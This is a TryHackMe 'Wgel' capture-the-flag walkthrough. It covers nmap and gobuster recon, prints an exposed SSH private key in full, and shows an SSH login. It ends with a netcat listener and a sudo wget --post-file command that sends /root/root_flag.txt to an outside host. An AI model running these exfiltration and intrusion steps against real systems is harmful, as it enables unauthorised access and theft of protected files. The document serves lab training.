# TryHackMe Wgel Writeup

-----

## nmap scan

```
nmap -sCV -Pn 10.65.178.9
```

<img width="1092" height="488" alt="image" src="https://github.com/user-attachments/assets/251e3a00-52e0-4c47-9f10-706ab7c485aa" />

## gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.66.170.226 
```

<img width="1249" height="555" alt="image" src="https://github.com/user-attachments/assets/4cc7b296-0527-4a8e-b286-1cbfc579f149" />

```
http://10.66.170.226/sitemap/
```

<img width="1907" height="751" alt="image" src="https://github.com/user-attachments/assets/23f13868-e395-47ad-909f-b5e5fd08b378" />

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.66.170.226/sitemap
```

<img width="1182" height="525" alt="image" src="https://github.com/user-attachments/assets/e28c5ca2-eb26-4e11-9da3-c47280411612" />

```
http://10.66.170.226/sitemap/.ssh/id_rsa
```

<img width="1316" height="513" alt="image" src="https://github.com/user-attachments/assets/74e99d33-0f2b-4ecd-9e4c-03fc4ac41721" />

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

## found username in source code 

```
Jessie
```

<img width="1850" height="737" alt="image" src="https://github.com/user-attachments/assets/b8d861f9-42a6-4da2-a664-2e304cc4eb99" />

## ssh login

```
ssh -i id_rsa jessie@10.66.170.226
```

<img width="891" height="403" alt="image" src="https://github.com/user-attachments/assets/159f280e-74fc-4b8c-81e3-8ef22ac0ebb1" />

```
find / -name "*flag*"
```

<img width="448" height="77" alt="image" src="https://github.com/user-attachments/assets/d2a5b779-92d0-4978-9b59-36188411c10c" />

## now get root flag

Starting listener
Use netcat to start listener.

```
nc -lvp 4444
```

### Now, Finally use wget command to get root flag through listner.

```
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.168.188:4444/
```

> ### The name of ROOT flag will be most probably `root_flag.txt` because the name of user flag was in this format.

<img width="1011" height="106" alt="image" src="https://github.com/user-attachments/assets/545280dc-7af2-4441-bee4-6239ae3857c1" />

<img width="805" height="309" alt="image" src="https://github.com/user-attachments/assets/7c2f74a7-69e7-4a79-a642-743e097abfa8" />

